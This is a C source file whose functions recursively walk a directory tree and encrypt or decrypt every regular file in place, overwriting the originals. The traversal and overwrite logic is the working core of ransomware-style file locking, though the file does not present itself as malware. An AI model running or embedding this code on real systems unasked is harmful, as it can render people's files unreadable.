#include "explorer.h"

/*
 * Recursively encrypt/decrypt inplace every file within the folder designed by dirfd.
 * * dirfd is closed at the end of this function so it should not be used again.
 * */
int handle_folder(unsigned char *key, enum action action, int dirfd)
{
    DIR *dp;
    struct dirent *ep;
    int current_fd;

    /* Check that the main directory has been opened correctly. */
    if (dirfd < 0)
    {
        perror("[handle_folder, open] Couldn't open the directory");
        return -1;
    }

    /* Get a directory stream on it. */
    dp = fdopendir(dirfd);
    if (dp == NULL)
    {
        perror("[handle_folder, opendir] Couldn't open the directory");
        return -2;
    }

    /* Browse it. */
    while (ep = readdir(dp))
    {
        switch (ep->d_type)
        {
            case DT_REG:
                printf("F: %s\n", ep->d_name);
                /* Open the current file. */
                current_fd = openat(dirfd, ep->d_name, O_RDWR);
                /* Apply the action to this file, the file descruptor will be closed by the underlying function. */
                handle_file(key, action, current_fd);
                break;
            case DT_DIR:
                if ((strncmp(ep->d_name, "..", 3) != 0) && ((strncmp(ep->d_name, ".", 2) != 0)))
                {
                    printf("D: %s\n", ep->d_name);
                    /* Open the current folder. */
                    current_fd = openat(dirfd, ep->d_name, O_RDONLY | O_DIRECTORY);
                    /* Apply the action to this folder, the descriptor will be closed by the underlying function. */
                    handle_folder(key, action, current_fd);
                }
                break;
            default:
                printf("U: %s\n", ep->d_name);
                break;
        };
    }

    /* Close the main directory. */
    closedir(dp);

    return 0;
}

/*
 * Encrypt / Decrypt (in place) the file pointed out by ftarget.
 * In case of encryption:
 * * Encrypt the plaintext file using key and iv to a temporary file.
 * * Copy the ciphertext temporary file back to the original file.
 * * Close both file descriptors, ftarget should not be used again.
 * In case of decryption:
 * * Decrypt the ciphertext from ftarget to a temporary file.
 * * Copy the plaintext result back to ftarget.
 * * Close both file descriptors, ftarget should not be used again.
 * */
int handle_file(unsigned char *key, enum action action, int ftarget)
{
    /* File descriptors to be used. */
    int ftmp;
    char path_template[9];

    /* Used for copying files. */
    int size;
    int total_size = 0;
    char *buffer = (char*) malloc(256*sizeof(char));

    /* Check that the target file was correctly opened. */
    if(ftarget < 0)
    {
        /* Handle errors. */
        perror("[handle_file] Error opening source file");
        return -1;
    }

    /* Open a temporary file that will act as a buffer. */
    memset(path_template, 'X', 9);
    path_template[0] = '.';
    path_template[8] = '\0';
    if (strnlen(mktemp(path_template), 9) <= 0)
    {
        perror("[handle_file] Error opening temporary file");
        abort();
    }
    ftmp = open(path_template, O_RDWR | O_CREAT | O_EXCL, S_IRUSR | S_IWUSR);
    if (ftmp < 0)
    {
        /* Handle errors. */
        perror("[handle_file] Error opening (temporary) destination file");
        return -2;
    }

    switch (action)
    {
        case ENCRYPT:
            /* Encryption from ftarget to ftmp. */
            encrypt(key, ftarget, ftmp);
            break;

        case DECRYPT:
            /* Decryption from ftarget to ftmp. */
            decrypt(key, ftarget, ftmp);
            break;

        default:
            fprintf(stderr, "Undefined behaviour during file management!\n");
            abort();
            break;
    };

    /* Reset the read/write file offset of both files. */
    lseek(ftarget, 0, SEEK_SET);
    lseek(ftmp, 0, SEEK_SET);

    /* Copy ftmp to ftarget (therefore erasing previous plaintext data). */
    total_size = 0;
    while((size = read(ftmp, buffer, 256)) > 0)
    {
        size = write(ftarget, buffer, size);
        if (size < 0)
        {
            perror("[handle_file] Error while writing ciphertext back to file");
            break;
        }
        else
        {
            total_size += size;
        }
    }

    /* Truncate the file if needed. */
    if (total_size > 0)
    {
        if(ftruncate(ftarget, total_size) < 0)
            perror("[handle_file] Error while truncating target file");
    }

    /* Truncate the temporary file. */
    if(ftruncate(ftmp, 0) < 0)
        perror("[handle_file] Error while truncating temporary file");

    /* Delete the temporary file. */
    if (unlink(path_template) < 0)
    {
        perror("[handle_file] Error deleting temporary file");
    }

    /* Close both file descriptors. */
    close(ftmp);
    close(ftarget);

    return 0;
}
